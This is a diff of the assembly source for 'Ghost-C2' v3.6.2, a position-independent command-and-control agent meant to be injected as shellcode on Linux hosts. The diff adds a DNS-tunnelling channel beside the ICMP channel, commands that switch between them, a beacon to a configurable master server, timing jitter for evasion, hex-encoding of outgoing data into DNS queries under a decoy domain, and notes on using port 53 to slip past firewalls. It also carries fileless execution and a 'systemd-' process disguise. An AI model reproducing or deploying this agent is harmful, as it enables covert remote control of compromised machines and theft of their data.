@@ -1,26 +1,29 @@
 DEFAULT REL
 BITS 64
 ; ===================================================================================
-;  ________  ___  ___  ________  ________  _________        ________  ________     
-; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\     |\   ____\|\_____  \    
-; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|     \ \  \___|\|____|\  \   
-;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \       \ \  \     ____\_\  \  
-;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \       \ \  \___|\____ \  \ 
-;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\       \ \______\\_________\
-;     \|_______|\|__|\|__|\|_______|\_________\   \|__|        \|______\|_________|
-;                                   \|_________|                                   
+;  ________  ___  ___  ________  ________  _________       ________  ________   
+; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\    |\   ____\|\_____  \  
+; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|    \ \  \___|\|____|\  \ 
+;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \      \ \  \     ____\_\  \ 
+;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \      \ \  \___|\____ \  \ 
+;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\      \ \______\\_________\
+;     \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
+;                                  \|_________|                                   
 ; ===================================================================================
-; Project      : Ghost-C2 (v3.6.1) - "The Invisible ICMP Phantom (PIC Edition)"
+; Project      : Ghost-C2 (v3.6.2) - "The Hybrid Phantom (Dual-Channel PIC Agent)"
 ; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
 ; Architecture : x86_64 Linux (Pure Assembly, Libc-free, 100% PIC)
 ; -----------------------------------------------------------------------------------
 ; Features:
-;   - Architecture: Fully Position Independent Code (RIP-Relative) for memory injection.
-;   - Transport   : ICMP Stealth Channel (Asymmetric ID+SEQ Auth: 45k/55k Sum)
-;   - Execution   : Fileless Execution via memfd_create (Runtime argv building)
-;   - Security    : Rolling XOR Encryption & Safe Stack Mapping (Buffer Isolation)
-;   - Evasion     : Adaptive Jitter (Nanosleep) and RDTSC Timestamp Mimicry.
-;	- Compression : dpcm-rle-hybrid-x64-compressor / https://github.com/JM00NJ/Vesqer-Baremetal-Compressor-DPCM-RLE-Hybrid-Engine
+;   - Architecture : Fully Position Independent Code (RIP-Relative) for memory injection.
+;   - Hybrid Transport: Dual-Channel (ICMP Stealth & DNS UDP Tunneling).
+;   - Pivot Logic  : Protocol Hot-Swapping via VTable (!D for DNS / !I for ICMP).
+;   - ICMP Module  : Asymmetric ID+SEQ Auth (45k/55k Sum Check).
+;   - DNS Module   : Transaction ID Integrity (High + Low = 0xFF Confirmation).
+;   - Execution    : Fileless via memfd_create (Runtime argv building & masquerade).
+;   - Security     : Rolling XOR Encryption & Safe Stack Mapping (Buffer Isolation).
+;   - Evasion      : Adaptive Jitter (Nanosleep) and RDTSC Timestamp Mimicry.
+;   - Compression  : dpcm-rle-hybrid-x64-compressor.
 ; -----------------------------------------------------------------------------------
 ; License: GNU Affero General Public License v3.0 (AGPL-3.0)
 ; Versions 3.6.0 and below are MIT. 3.6.1+ is AGPL-3.0.
@@ -28,11 +31,11 @@ BITS 64
 ; testing purposes only. The author is not responsible for any misuse.
 ; -----------------------------------------------------------------------------------
 ; Build (Raw Binary) : nasm -f bin sniff_pic.asm -o shellcode.bin
-; Build (Hex Format) : hexdump -v -e '"\\x" 1/1 "%02x"' shellcode.bin
-;                 OR : xxd -i shellcode.bin
+; Build (Hex Format) : python3 -c "print(open('shellcode.bin','rb').read().hex())"
+; Build (C-Array)    : xxd -i shellcode.bin
 ;
 ; Note: The pre-compiled shellcode is already embedded inside the Phantom Loader. 
-; You only need to run these build commands if you modify this PIC agent's source.
+; You only need to build if you modify the Agent's PIC source logic.
 ; ===================================================================================
 
 section .text
@@ -102,103 +105,41 @@ _start:
     syscall
 	; Step 3: Ağ Modülünü Başlat (Hangi protokol VTable'da ise o çalışır)
     call [rbp + 0x3000]
+    
+    ; --- İLK BEACON (MERHABA PAKETİ) ---
+    mov r12, 0              ; Payload boyutu 0 olsun (Boş paket)
+    call [rbp + 0x3010]     ; VTable Index 2: _send çağır! (Master'a sinyal gider)
+    ; -----------------------------------
+    
 _sniff:
-    ; Initialize sockaddr parameters for recvfrom
-    mov dword [rbp + 0x14], 16           
-    xor r10, r10                
-    ; Clear receive buffer (Zero-out)
-    lea rdi, [rbp + 0x2000]    
-    xor al, al                  
-    mov rcx, 1200               
-    rep stosb                   
-    ; Listen for ICMP Packets
-    mov rax, 45                 ; sys_recvfrom
-    mov edi, dword [rbp + 0x10]           
-    lea rsi, [rbp + 0x2000]      
-    mov rdx, 1200
-    xor r10, r10
-    lea r8, [rbp + 0x20]        
-    lea r9, [rbp + 0x14]              
-    syscall
-    ; Filter for ICMP Echo Requests (Type 8)
-    cmp byte [rbp + 0x2000 + 20], 8 
-    jne _sniff                      
-    ; Error handling
-    cmp rax, 0                  
-    jl _error                   
-    je _exit                    
-    ; --- [MIMICRY UPDATE] SIZE VALIDATION ---
-    ; Expected: IP(20) + ICMP(8) + Mimicry(24) = 52 Bytes
-    cmp rax, 52                 
-    jb _sniff                   
-    push rax
-    push rdx
-; --- MAGIC SEQUENCE VERIFICATION (MASTER KEY) ---
-    movzx eax, word [rbp + 0x2000 + 26] ; Extract Sequence
-    xchg al, ah                         ; Endianness correction
-    movzx edx, word [rbp + 0x2000 + 24] ; Extract Identifier
-    xchg dl, dh                         ; Endianness correction
-    add eax, edx                        ; EAX = SEQ + ID
-    cmp eax, 45000                        ; Verify Master's key total (45000)
-    pop rdx                             ; Restore saved RDX
-    pop rax                             ; Restore saved RAX (Packet size)
-    jne _sniff                          ; Ignore packet if validation fails                    
-    ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
-    mov r14, rax
-    sub r14, 52                     ; Strip IP, ICMP Header and Mimicry Padding
-    lea rsi, [rbp + 0x2000 + 52]    ; Start reading from offset 52 (Secret data)
+	call [rbp + 0x3008]     ; VTable'dan Dinleme Fonksiyonunu Çağır (ICMP veya DNS)
+    test rax, rax           ; RAX 0 döndüyse paket geçersizdir
+    jz _sniff               ; Geçersizse tekrar dinlemeye dön
+    
+    ; --- DECRYPTION & OFFSET HANDLING ---
+    mov r14, rax                    ; RAX'ta payload boyutu var
+    lea rsi, [rbp + 0x2000 + 52]    ; Veri adresini al
     mov rcx, r14
-    call _xor_cipher                ; Decrypt the command string
-    mov [rbp + 0x1200 + 16], rsi      ; Inject decrypted command into argv_array
-    mov rdx, r14                     
-    push rdx                        ; Save length for write syscall
-    push rsi                        ; Save address for logging
-    ; --- IP ADDRESS TO STRING CONVERSION ---
-    xor rdx, rdx                     
-    xor rbx, rbx                     
-    mov rcx, 7                       ; IP raw byte offset
-    mov rdi, 15                      ; String buffer offset
-_loopforip:
-    mov bl, 10                       
-    movzx ax, [rbp + 0x20 + rcx]  
-_divloop:
-    div bl                           
-    add ah, 48                       ; Convert digit to ASCII
-    mov [rbp + 0x40 + rdi], ah          
-    dec rdi                          
-    xor ah, ah                       
-    cmp al, 0                        
-    jg _divloop                      
-    cmp rcx, 4                       
-    je _contiune                     
-    mov byte [rbp + 0x40 + rdi], 46     ; Dot (.)
-_contiune:
-    dec rdi                          
-    dec rcx                          
-    cmp rcx, 3                       
-    jg _loopforip                    
-    ; --- LOGGING RECEIVED PACKET ---
-    mov rax, 1                       ; sys_write (Source IP)
-    mov rdi, 1                       
-    mov rdx, 16                      
-    lea rsi, [rbp + 0x40]                 
-    syscall
-    mov rax, 1                       ; sys_write (Space)
-    mov rdi, 1                       
-    mov rdx, 1                       
-    lea rsi, [rel space_char]           
-    syscall
-    pop rsi                          ; Restore command address
-    pop rdx                          ; Restore command length
-    mov rax, 1                       ; sys_write (Received Command)
-    mov rdi, 1                       
-    syscall                          
-    mov rax, 1                       ; sys_write (Newline)
-    mov rdi, 1                       
-    lea rsi, [rel newline]                
-    mov rdx, 1                       
-    syscall
-    jmp _execute_command            
+    call _xor_cipher                ; şifreyi çöz
+    
+    ; --- AJAN PIVOT KONTROLÜ --
+    cmp byte [rsi], '!'   ; Komut '!' ile mi başlıyor? (Özel komut işareti)
+    jne _execute_command  ; Değilse normal shell komutudur, devam et.
+    
+    ; Eğer '!' ise pivot kontrolü yap
+    cmp byte [rsi + 1], 'D' ; !D (DNS'e geç anlamında basit bir check)
+    je _switch_to_dns
+    
+    cmp byte [rsi +1], 'I'
+    je _switch_to_icmp
+    
+    ; --- [MIMICRY UPDATE] DECRYPTION & OFFSET HANDLING ---
+    mov [rbp + 0x1200 + 16], rsi
+	mov rdx, r14                     
+    push rdx                        ; Yazdırma / döngü işlemleri için boyut koruması
+    push rsi                        
+
+    jmp _execute_command            ; Execve'ye jmpla
 _wait_for_child:
     mov rax, 61                     ; sys_wait4
     mov rsi, 0                      
@@ -473,7 +414,60 @@ _vesqer_compress:
     pop rbx
     ret
  
- 
+_lcg_jitter:
+	push rax
+    push rbx
+    push rcx
+    push rdx
+    push rsi
+    push rdi
+    push rbp
+    push r8
+    push r9
+    push r10
+    push r11
+    push r12
+    push r13
+    push r14
+    push r15
+
+    rdtsc                           ; EAX = TSC düşük 32 bit
+    imul eax, eax, 1664525          ; LCG karıştırma (entropi arttırır)
+    add  eax, 1013904223
+
+    xor  edx, edx                   ; div için EDX:EAX hazırla
+    mov  ecx, 900000000             ; mod 900M  → [0, 900M)
+    div  ecx
+    add  edx, 100000000             ; +100M → [100ms, 1000ms)
+
+    ; timespec stack'te: [rbp-16] = tv_sec, [rbp-8] = tv_nsec
+    sub  rsp, 32                    ; 2 × timespec (hizalı)
+    mov  qword [rsp],    0          ; tv_sec  = 0
+    mov  qword [rsp+8],  rdx        ; tv_nsec = hesaplanan değer
+
+    mov  rax, 35                    ; sys_nanosleep
+    mov  rdi, rsp                   ; req = &timespec
+    xor  rsi, rsi                   ; rem = NULL
+    syscall
+
+    add  rsp, 32                    ; stack temizle
+
+	pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop r11
+    pop r10
+    pop r9
+    pop r8
+    pop rbp
+    pop rdi
+    pop rsi
+    pop rdx
+    pop rcx
+    pop rbx
+    pop rax
+    ret
  
 ; =================================================================
 ; GHOST-C2 PROTOCOL MODULE: ICMP
@@ -499,31 +493,12 @@ _icmp_send:
     lea rsi, [rbp + 0x100]      
     lea rdx, [r12 + 32]         ; Header(8) + Mimicry(24) + Payload(r12)
     mov r10, 0               
-    lea r8, [rbp + 0x20]        
+    lea r8, [rel master_addr]       
     mov r9, 16               
     syscall
 
     ; --- ICMP'YE ÖZEL JITTER ---
-    push rax                
-    push rcx                
-    push r11                
-    push rdx                
-    rdtsc
-    xor rdx, rdx
-    mov ecx, 900000000
-    div ecx                  
-    add edx, 100000000       
-    mov qword [rbp + 0x200], 0      
-    mov qword [rbp + 0x208], rdx    
-    mov rax, 35                     
-    lea rdi, [rbp + 0x200]            
-    lea rsi, [rbp + 0x200 +16]            
-    syscall
-    pop rdx
-    pop r11                 
-    pop rcx
-    pop rax
-    ret
+	call _lcg_jitter
 
 ; --- ICMP ÖZEL: ID/SEQ Üretimi ---
 _create_seq_id:
@@ -574,24 +549,339 @@ _checksum_cal:
     mov word[rbp + 0x100 + 2], ax               
     ret
 _icmp_recv:
-    ; Şimdilik ana döngüde (_sniff) sys_recvfrom kullandığımız için burası boş.
-    ; Ama VTable'da adresi geçtiği için bu etiketin (label) burada tanımlı olması şart.
+    ; 1. Receive Buffer Cleaning (rbp + 0x2000)
+    lea rdi, [rbp + 0x2000]
+    xor al, al
+    mov rcx, 1200
+    rep stosb
+
+    ; 2. sys_recvfrom
+    mov dword [rbp + 0x14], 16       ; addr_len
+    mov rax, 45                      ; sys_recvfrom
+    mov edi, dword [rbp + 0x10]      ; FD
+    lea rsi, [rbp + 0x2000]          ; Buffer
+    mov rdx, 1200                    ; Max len
+    xor r10, r10                     ; Flags = 0
+    lea r8, [rbp + 0x20]             ; incoming_addr
+    lea r9, [rbp + 0x14]             ; addr_len ptr
+    syscall
+
+    ; 3. ICMP confirmation
+    test rax, rax                    ; checking for error or no data
+    jle .invalid_packet
+
+    ; Size check: IP(20) + ICMP(8) + Mimicry(24) = 52 Byte
+    cmp rax, 52
+    jb .invalid_packet
+
+    ; Type 8 (Echo Request) kontrolü
+    cmp byte [rbp + 0x2000 + 20], 8
+    jne .invalid_packet
+
+    ; 4. Asimetrik ID CONFIRMATION (Master Auth: ID + SEQ = 45000)
+    movzx ebx, word [rbp + 0x2000 + 26] ; Take Seq
+    xchg bl, bh                         ; Endianness fix
+    movzx ecx, word [rbp + 0x2000 + 24] ; Take ID
+    xchg cl, ch                         ; Endianness fix
+    add ebx, ecx                        ; SUM
+    cmp ebx, 45000                      ; Does keys equal ?
+    jne .invalid_packet
+	sub rax, 52
     ret
+
+.invalid_packet:
+    xor rax, rax                     ; IF its invlaid packet rax = 0
+    ret
+    
+    
+
+; =================================================================
+; GHOST-C2 PROTOCOL MODULE: DNS (AGENT SIDE - PIC COMPLIANT)
+; =================================================================
+_dns_init:
+    mov rax, 41             ; syscall: socket
+    mov rdi, 2              ; AF_INET
+    mov rsi, 2              ; SOCK_DGRAM
+    mov rdx, 17             ; IPPROTO_UDP
+    syscall
+    test rax, rax
+    js _exit                ; Hata varsa sessizce öl
+    mov [rbp + 0x10], eax   ; FD'yi Stack Anchor'a güvenle kaydet!
+    ret
+
+_dns_send:
+    lea rdi, [rbp + 0x500]  ; Ajanın DNS Paket Gönderme Buffer'ı
+
+.retry_rand:
+    rdrand eax
+    jnc .retry_rand
+    mov dl, 0xFF
+    sub dl, al
+    mov ah, dl
+    mov word [rdi], ax
+    mov dword [rdi + 2], 0x01000001
+    mov dword [rdi + 6], 0
+    mov word [rdi + 10], 0
+
+    add rdi, 12                     ; QNAME başlangıcına zıpla
+
+    ; --- R12 (Veri) Kontrolü ---
+    test r12, r12                   ; İlk beacon (0 bayt) mı?
+    jz .skip_encode                 ; Evetse şifrelemeyi atla!
+
+    ; Payload Kodlama
+    lea rsi, [rbp + 0x100 + 32]     ; Şifreli ajan verisinin adresi
+    mov rcx, r12                    ; R12'de boyut var
+    mov rax, r12
+    shl rax, 1                      ; Boyutu 2 ile çarp (Hex uzunluğu)
+    mov byte [rdi], al              ; DNS Label uzunluğunu yaz
+    add rdi, 1                      ; İleri kay
+
+    call _dns_encode                ; Şifrele (RDI otomatik ilerler)
+
+.skip_encode:
+    ; Fake Domain'i kopyala
+    lea rsi, [rel fake_domain]      ; REL kullanarak PIC uyumlu kopyalama
+.copy_domain:
+    lodsb
+    stosb
+    test al, al
+    jnz .copy_domain
+
+    mov dword [rdi], 0x01001000     ; QTYPE ve QCLASS
+    add rdi, 4
+
+    ; Dinamik Boyut Hesaplama
+    lea r8, [rbp + 0x500]
+    mov rdx, rdi
+    sub rdx, r8                     ; RDX = Toplam Paket Boyutu
+
+    mov rax, 44                     ; sys_sendto
+    mov edi, dword [rbp + 0x10]     ; FD'yi Anchor'dan AL!
+    lea rsi, [rbp + 0x500]          ; Gönderilecek Buffer
+    mov r10, 0
+    lea r8, [rel master_addr]       ; HEDEF İP (Aşağıdan Okuyacak)
+    mov r9, 16
+    syscall
+
+    call _lcg_jitter
+    ret
+
+_dns_recv:
+    lea rdi, [rbp + 0x2000]             ; Recv Buffer'ı temizle
+    xor al, al
+    mov rcx, 1200
+    rep stosb
+
+    mov dword [rbp + 0x14], 16
+    mov rax, 45                         ; sys_recvfrom
+    mov edi, dword [rbp + 0x10]         ; FD'yi Anchor'dan AL!
+    lea rsi, [rbp + 0x2000]
+    mov rdx, 1200
+    xor r10, r10
+    lea r8, [rbp + 0x20]
+    lea r9, [rbp + 0x14]
+    syscall
+
+    cmp rax, 12
+    jb .invalid_packet
+
+    movzx ebx, word [rbp + 0x2000]
+    add bl, bh
+    cmp bl, 0xFF
+    jne .invalid_packet
+
+    ; --- DNS DECODER (QNAME İLK ETİKETİ OKU VE ÇEVİR) ---
+    lea rsi, [rbp + 0x2000 + 12]        ; QNAME başlangıcı
+    lodsb                               ; AL = Hex uzunluğu
+    test al, al
+    jz .invalid_packet                  
+    
+    movzx rcx, al
+    shr rcx, 1                          ; Gerçek boyut (Hex/2)
+    push rcx                            ; RAX için sakla
+    
+    lea rdi, [rbp + 0x2000 + 300]        ; KÖPRÜ OFSETİ
+    
+.decode_loop:
+    lodsb
+    cmp al, '9'
+    jbe .is_num1
+    sub al, 0x57
+    jmp .merge1
+.is_num1:
+    sub al, 0x30
+.merge1:
+    shl al, 4
+    mov dl, al
+    
+    lodsb
+    cmp al, '9'
+    jbe .is_num2
+    sub al, 0x57
+    jmp .merge2
+.is_num2:
+    sub al, 0x30
+.merge2:
+    add al, dl
+    stosb
+    
+    dec rcx
+    jnz .decode_loop
+    
+    pop rax                             ; Orijinal boyutu RAX'a çek
+    
+    ; --- YENİ KÖPRÜ: İşlem bitince temiz veriyi asıl yerine (52) taşı ---
+    push rax
+    mov rcx, rax
+    lea rsi, [rbp + 0x2000 + 300]
+    lea rdi, [rbp + 0x2000 + 52]
+    cld
+    rep movsb
+    pop rax
+    ret
+
+.invalid_packet:
+    xor rax, rax
+    ret
+
+	
+_dns_encode:
+	test rcx, rcx       ; Veri var mı?
+    jz .done
+	push r15
+	push r14
+	push r13
+	xor r15, r15
+	mov r14d, 0x30
+	mov r13d, 0x57
+	cld
+
+.next_byte:
+	; THIS SECTION FOR ASCII TRANSLATION
+	
+	lodsb
+	mov dl, al					; backup
+	shr al, 4
+	cmp al, 9
+	cmovbe r15d, r14d			; if al less than 9
+	cmova r15d, r13d			; if al greater than 9
+	add al, r15b					; adding r15 to al
+	stosb
+	
+	mov al, dl					; getting back the backup
+	and al, 0x0F
+	cmp al, 9
+	cmovbe r15d, r14d
+	cmova r15d, r13d
+	add al, r15b
+	stosb
+
+	dec rcx
+	jnz .next_byte
+
+	
+.done:
+	pop r13
+	pop r14
+	pop r15
+	ret
+
+_switch_to_dns:
+    ; 1. Eski soketi kapat (Clean Exit)
+    mov rax, 3          ; sys_close
+    mov edi, dword [rbp + 0x10]
+    syscall
+
+    ; 2. VTable'ı DNS adresleriyle OVERWRITE et!
+    lea rax, [rel _dns_init]
+    mov [rbp + 0x3000], rax
+    lea rax, [rel _dns_recv]
+    mov [rbp + 0x3008], rax
+    lea rax, [rel _dns_send]
+    mov [rbp + 0x3010], rax
+
+
+    ; 3. Yeni protokolü başlat ve dinlemeye dön
+    call [rbp + 0x3000]
+    
+    call _lcg_jitter        ; Master'ın hazırlanması için 1 sn bekle
+    mov r12, 0              ; Boş beacon
+    call [rbp + 0x3010]     ; _dns_send çağır!
+    jmp _sniff
+
+_switch_to_icmp:
+    ; 1. Eski soketi kapat (Açık olan DNS UDP soketini öldür)
+    mov rax, 3              ; sys_close
+    mov edi, dword [rbp + 0x10]
+    syscall
+
+    ; 2. VTable'ı ICMP adresleriyle OVERWRITE et!
+    lea rax, [rel _icmp_init]
+    mov [rbp + 0x3000], rax
+    lea rax, [rel _icmp_recv]
+    mov [rbp + 0x3008], rax
+    lea rax, [rel _icmp_send]
+    mov [rbp + 0x3010], rax
+
+    ; 3. Yeni protokolü (ICMP) başlat
+    call [rbp + 0x3000]     ; _icmp_init çalışır ve yeni Raw Socket açılır
+    
+    ; 4. ICMP Beacon atmaz! Direkt pusuya (sniff) yatar.
+
+    jmp _sniff
+
 _exit:
     mov rax, 60                     ; sys_exit
     mov rdi, 0                      
     syscall
 _hang_host:
-    mov rax, 34         ; sys_pause (Sonsuza kadar bekler)
+    mov rax, 34         ; sys_pause infinte loop / (Sonsuza kadar bekler)
     syscall
-    jmp _hang_host      ; Uyanırsa tekrar uyut
+    jmp _hang_host      ; If wake up go sleep it again / Uyanırsa tekrar uyut
 ; =================================================================
 
 ; 🚩 GHOST-C2 VERİ DEPOSU (KODUNUN PARÇASI)
 
 ; =================================================================
 
+; ============================================================================
+; [!] CRITICAL OPSEC CONFIGURATION [!]
+; ============================================================================
+; This is the 'sockaddr_in' structure. The Agent uses this to determine WHERE 
+; to send the initial beacon and exfiltrated data. 
+; YOU MUST MODIFY THESE VALUES TO MATCH YOUR MASTER C2 SERVER BEFORE COMPILING!
 
+master_addr:
+    ; sin_family: AF_INET (IPv4 Protocol) - Do not change.
+    dw 2                
+    
+    ; sin_port: The UDP port for DNS Tunneling. 
+    ; [WARNING] THIS MUST BE IN NETWORK BYTE ORDER (Big-Endian)!
+    ; - Local Testing : Port 5300 (0x14B4 -> reversed to 0xB414) to avoid port conflicts.
+    ; - Real Operation: Port 53   (0x0035 -> reversed to 0x3500) for standard DNS bypass.
+    dw 0xB414           
+    
+    ; sin_addr: The IP Address of your Master C2 Server.
+    ; Format: Comma-separated decimal values. 
+    ; Example: If Master is 192.168.1.15 -> change to: db 192, 168, 1, 15
+    db 127, 0, 0, 1     
+    
+    ; sin_zero: 8 bytes of padding to match the standard socket structure size.
+    dq 0                
+
+; ----------------------------------------------------------------------------
+; DNS TUNNELING DOMAIN CONFIGURATION
+; ----------------------------------------------------------------------------
+; This is the decoy domain used in the DNS Question (QNAME) section to bypass
+; firewall restrictions and blend in with regular network traffic.
+; 
+; FORMAT RULE (RFC 1035): [Length], "Label", [Length], "Label", 0 (Null-terminated)
+; Example 1: "c2.com"      -> db 2, "c2", 3, "com", 0
+; Example 2: "update.net"  -> db 6, "update", 3, "net", 0
+
+fake_domain db 5, "ghost", 3, "com", 0   
+; ============================================================================
 
 fake_name    db "systemd-"
 
